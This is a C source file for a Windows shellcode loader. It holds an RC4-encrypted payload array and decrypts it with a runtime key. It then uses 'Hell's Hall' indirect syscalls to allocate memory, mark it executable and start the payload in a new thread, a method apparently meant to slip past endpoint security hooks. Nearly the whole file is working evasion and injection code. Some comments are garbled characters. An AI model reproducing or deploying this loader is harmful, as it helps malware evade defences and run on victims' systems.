#include <helper.h>

static unsigned char Payload[] =
{
    0x42, 0x74, 0x38, 0xf0, 0x2c, 0x05, 0x63, 0x13, 0xaa, 0x8d, 0x8f, 0x72, 0xaf, 0x56, 0x70, 0xaa, 0x69, 0x52, 0x54, 0xc6, 0x6a, 0x75, 0x9e, 0x3c,
    0x73, 0xed, 0x32, 0x11, 0x45, 0x60, 0x5a, 0x61, 0x79, 0x7f, 0xcb, 0x31, 0x0e, 0xcb, 0x00, 0x2c, 0xa3, 0x13, 0x06, 0xb6, 0x05, 0x3e, 0xe0, 0x6c,
    0xdc, 0x1e, 0xb6, 0x26, 0x67, 0x8f, 0xfa, 0xc7, 0x32, 0x38, 0x73, 0x2d, 0xd2, 0xdc, 0xe6, 0x2b, 0xf2, 0xc3, 0x17, 0xba, 0xbe, 0xbd, 0xdd, 0x70,
    0x2a, 0x40, 0xaf, 0xd5, 0x9f, 0xf8, 0x5f, 0x4b, 0xe6, 0x34, 0x93, 0x06, 0xf2, 0x86, 0x3d, 0x39, 0x83, 0x0d, 0x5e, 0xdc, 0x2b, 0x84, 0x1f, 0xb8,
    0xeb, 0x0c, 0xc9, 0x29, 0x9d, 0xc9, 0x1c, 0xca, 0xb7, 0xe2, 0x20, 0xcf, 0x30, 0x2f, 0x8a, 0xf0, 0xf1, 0xe3, 0x2b, 0x07, 0xd5, 0xbe, 0xb8, 0xec,
    0x8e, 0xb9, 0xb0, 0x33, 0x00, 0x89, 0x54, 0xfc, 0x89, 0x50, 0x57, 0x26, 0x45, 0x45, 0x49, 0x6e, 0xa5, 0x7b, 0xbf, 0xb3, 0x00, 0xb2, 0xf5, 0xe4,
    0xc2, 0xdf, 0xb3, 0xcd, 0xa5, 0xff, 0xda, 0x69, 0x78, 0xcb, 0xa0, 0x6f, 0x04, 0x07, 0x03, 0xc7, 0xe9, 0x5e, 0x53, 0x7c, 0xb8, 0xb5, 0xea, 0xd6,
    0xc5, 0x24, 0xf3, 0xaf, 0x53, 0x32, 0x5c, 0x22, 0x8a, 0x4a, 0x78, 0x98, 0xb1, 0x37, 0x89, 0xb6, 0x01, 0x56, 0xdb, 0x19, 0xd7, 0xb1, 0x81, 0xd6,
    0x84, 0xa0, 0x1b, 0x2a, 0x61, 0x84, 0x26, 0x48, 0xf1, 0x84, 0x5e, 0x43, 0x97, 0xba, 0x65, 0xb8, 0x71, 0xb0, 0x3b, 0x61, 0x5b, 0x6e, 0xbc, 0xca,
    0x76, 0x40, 0x04, 0xf2, 0x18, 0xe8, 0x3d, 0x4e, 0x18, 0x27, 0x63, 0x6c, 0x3c, 0xb3, 0xea, 0xf5, 0xfb, 0x33, 0x58, 0x6e, 0x12, 0x6c, 0xa3, 0xa9,
    0xc8, 0x54, 0xaa, 0xbd, 0xff, 0x37, 0x35, 0xfb, 0x98, 0x8c, 0xa7, 0x24, 0x41, 0xcd, 0xc2, 0x0a, 0x8f, 0x67, 0x85, 0x4c, 0x0a, 0x58, 0x8c, 0x37,
    0xd5, 0xb8, 0x41, 0x47, 0x78, 0x62, 0xdf, 0x16, 0x02, 0x99, 0x3a, 0x3d, 0x68, 0xce, 0xe7, 0x4a, 0xee, 0x0c, 0x40, 0x91, 0xa5, 0xf7, 0xc9, 0x71,
    0xcf, 0x44, 0x5e, 0x43, 0x93, 0x29, 0xd2, 0x44, 0xce, 0xc9, 0xb1, 0x65, 0x97
};

static void rc4_init(uint8_t* s, uint8_t* key, uint32_t len) {
    int i, j;
    uint8_t k[256];

    for (i = 0; i < 256; i++) {
        s[i] = i;
        k[i] = key[i % len];
    }

    for (i = 0, j = 0; i < 256; i++) {
        j = (j + s[i] + k[i]) % 256;
        uint8_t temp = s[i];
        s[i] = s[j];
        s[j] = temp;
    }
}

static void rc4_crypt(uint8_t* s, uint8_t* data, uint32_t len) {
    int i = 0, j = 0, t;

    for (size_t n = 0; n < len; n++) {
        i = (i + 1) % 256;
        j = (j + s[i]) % 256;

        uint8_t temp = s[i];
        s[i] = s[j];
        s[j] = temp;

        t = (s[i] + s[j]) % 256;
        data[n] ^= s[t];
    }
}

static void print_array_as_c_array(uint8_t* array, uint32_t len) {
    PRINTA("{ ");
    for (size_t i = 0; i < len; i++) {
        PRINTA("0x%02x", array[i]);
        if (i < len - 1) PRINTA(", ");
    }
    PRINTA(" }");
}

BOOL RunPayload()
{
    PVOID		pAddress = NULL;
    SIZE_T		dwSize = sizeof(Payload);
    DWORD		dwOld = NULL;
    HANDLE		hThread = NULL;
    NTSTATUS	STATUS = NULL;

    pHellsHallStruct S = GetHellsHallStruct();

    SYSCALL(S->NtAllocateVirtualMemory);
    if ((STATUS = HellHall((HANDLE)-1, &pAddress, 0, &dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) != 0x0) {
        PRINTA("[!] NtAllocateVirtualMemory Failed With Status : 0x%0.8X\n", STATUS);
        return -1;
    }

    PRINTA("[+] [HELL HALL] pAddress : 0x%p \n", pAddress);

    uint32_t key = GetInitKey();

    // �����������
    // ������������� S-�����
    uint8_t s_block[256];

    rc4_init(s_block, &key, 4);
    rc4_crypt(s_block, Payload, sizeof(Payload));

    // ����� �������������� ������
    PRINTA("Decrypt data: %x", key);
    print_array_as_c_array(Payload, sizeof(Payload));
    PRINTA("\n");

    memcpy(pAddress, Payload, sizeof(Payload));

    SYSCALL(S->NtProtectVirtualMemory);
    if ((STATUS = HellHall((HANDLE)-1, &pAddress, &dwSize, PAGE_EXECUTE_READ, &dwOld)) != 0x0) {
        PRINTA("[!] NtProtectVirtualMemory Failed With Status : 0x%0.8X\n", STATUS);
        return FALSE;
    }

    SYSCALL(S->NtCreateThreadEx);
    if ((STATUS = HellHall(&hThread, 0x1FFFFF, NULL, (HANDLE)-1, pAddress, NULL, FALSE, NULL, NULL, NULL, NULL)) != 0x0) {
        PRINTA("[!] NtCreateThreadEx Failed With Status : 0x%0.8X\n", STATUS);
        return FALSE;
    }


    PRINTA("[#] [HELL HALL] OK ... \n");

    return TRUE;
}